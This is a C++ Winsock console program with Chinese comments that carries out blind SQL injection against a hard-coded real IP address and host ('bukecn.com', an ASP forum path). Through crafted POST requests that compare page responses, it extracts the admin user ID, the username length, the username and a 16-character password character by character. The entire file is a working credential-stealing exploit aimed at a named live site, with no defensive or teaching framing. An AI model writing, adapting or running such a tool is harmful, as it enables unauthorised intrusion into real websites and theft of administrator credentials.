// sqlinject.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include <winsock2.h>
#pragma comment(lib,"ws2_32")
#include <stdio.h>
#include "http.h"

SOCKET sClient;
//返回的是正常页面还是错误页面
BOOL RetCmp(char *revData,int ret)
{
	//页面返回正确时会出现的特定字符串
    char *tocmp="http://www.nohack.cn/";
	char *Data;
	for(int i=0;i<ret;i++)
	{
		//指针依次递加
		Data=(char*)&revData[i];
		//和特定字符串比较
		if(strncmp(Data,tocmp,strlen(tocmp))==0)
			return TRUE;
	}
	return FALSE;
}

//发送数据，同时调用RetCmp函数判断返回页面情况
BOOL SendData(char *data)
{
	int ret;
	char revData[1024];
	//发送数据
	send(sClient,data,strlen(data),0);
	//接受数据
	ret=recv(sClient,revData,1024,0);
	if(ret>0)
	{
		//判断页面返回情况
		if(RetCmp(revData,ret))
		{
			return TRUE;
		}
		return FALSE;
	}
}
int main(int argc, char* argv[])
{
	WSADATA wsaData;
    WORD sockVersion = MAKEWORD(2, 2);
	//加载winsock库
	if(WSAStartup(sockVersion, &wsaData) != 0)
		return 0;
	// 创建套节字
    sClient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(sClient == INVALID_SOCKET)
	{
		printf("socket error\n");
		return 0;
	}	
	// 在sockaddr_in结构中装入服务器端地址信息
	sockaddr_in servAddr;
	servAddr.sin_family = AF_INET;
	servAddr.sin_port = htons(80);
	servAddr.sin_addr.S_un.S_addr =inet_addr("61.191.55.102");
	//连接服务器端
	if(connect(sClient,(sockaddr*)&servAddr,sizeof(servAddr))==SOCKET_ERROR)
	{
		printf("connect error\n");
		closesocket(sClient);
		return 0;
	}
	int ret;
	char revData[1024];
	char packet[1024];
	char *url="/bbs/Databackup/sql/index.asp";
	char *host="bukecn.com";
	//替换空格用
	char k[10]="%20";
	//存放注入语句
	char data[512];
	int i=1;
	int id=1;
	int j;
	int asc;
	char out[2]={0};
	printf("正在猜解用户ID........\n");
	printf("用户ID：");
	while(1)
	{
		//构造猜解最小的用户ID的注入语句
		wsprintf(data,"id=1%sand%s1=(select%scount(*)%sfrom%sadmin%swhere%sid=%d)",
			k,k,k,k,k,k,k,id);
		//构造Post包
		HttpPostPacket(packet,url,host,data);
		//发送数据并且判断页面返回情况
		if(SendData(packet))
		{
			printf("%d\n",id);
			break;
		}
		id=id+1;
	}
	printf("正在猜解用户名长度........\n");
	while(1)
	{
		//构造财猜解用户名长度的sql注入语句
		wsprintf(data,"id=1%sand%s1=(Select%scount(*)%sfrom"
			"%s[admin]%swhere%sid=%d%sand%slen(admin)=%d)",
			k,k,k,k,k,k,k,id,k,k,i);
        //构造Post包
		HttpPostPacket(packet,url,host,data);
		//发送数据并且判断页面返回情况
		if(SendData(packet))
		{
			printf("用户名长度：%d\n",i);
			break;
		}
		i=i+1;
	}
	printf("正在猜解用户名.........\n");
	printf("用户名：");
	for (j=0;j<i;j++)
	{
		asc=97;
		while(1)
		{
			//猜解用户名的sql语句
			wsprintf(data,"id=1%sand%s1=(Select%scount(*)%sfrom%s[admin]%s"
				"where%sasc(mid(cstr(admin),%d,1))=%d%sand%sid=%d)",
				k,k,k,k,k,k,k,j+1,asc,k,k,id);
			HttpPostPacket(packet,url,host,data);
			if(SendData(packet))
			{
				out[0]=asc;
				printf("%s",out);
				break;
			}
			asc=asc+1;
		}
	}
	printf("\n正在猜解密码.........\n");
	printf("密码：\n");
	for (i=0;i<16;i++)
	{
		//判断每一位密码的asc码值的范围的sql注入语句
		wsprintf(data,"id=1%sand%s1=(Select%scount(*)%sfrom%s[admin]%swhere%s"
			"asc(mid(cstr(password),%d,1))%sbetween%s48%sand%s57%sand%sid=%d)",
			k,k,k,k,k,k,k,i+1,k,k,k,k,k,k,id);
		HttpPostPacket(packet,url,host,data);
		if(SendData(packet))
		{
			asc=48;
			while(1)
			{
				//猜解密码的sql语句
				wsprintf(data,"id=1%sand%s1=(Select%scount(*)%sfrom%s"
					"[admin]%swhere%sasc(mid(cstr(password),%d,1))=%d%sand%sid=%d)",
					k,k,k,k,k,k,k,i+1,asc,k,k,id);
				HttpPostPacket(packet,url,host,data);
				if(SendData(packet))
				{
					out[0]=asc;
					printf("%s",out);
					break;
				}
				asc=asc+1;
			}
		}
		else
		{
			asc=97;
			while(1)
			{
				//猜解密码的sql语句
				wsprintf(data,"id=1%sand%s1=(Select%scount(*)%sfrom%s"
					"[admin]%swhere%sasc(mid(cstr(password),%d,1))=%d%sand%sid=%d)",
					k,k,k,k,k,k,k,i+1,asc,k,k,id);
				HttpPostPacket(packet,url,host,data);
				if(SendData(packet))
				{
					out[0]=asc;
					printf("%s",out);
					break;
				}
				asc=asc+1;
			}
		}
	}
	printf("\n猜解完毕\n");
	closesocket(sClient);
	WSACleanup();
	getchar();
	return 0;
}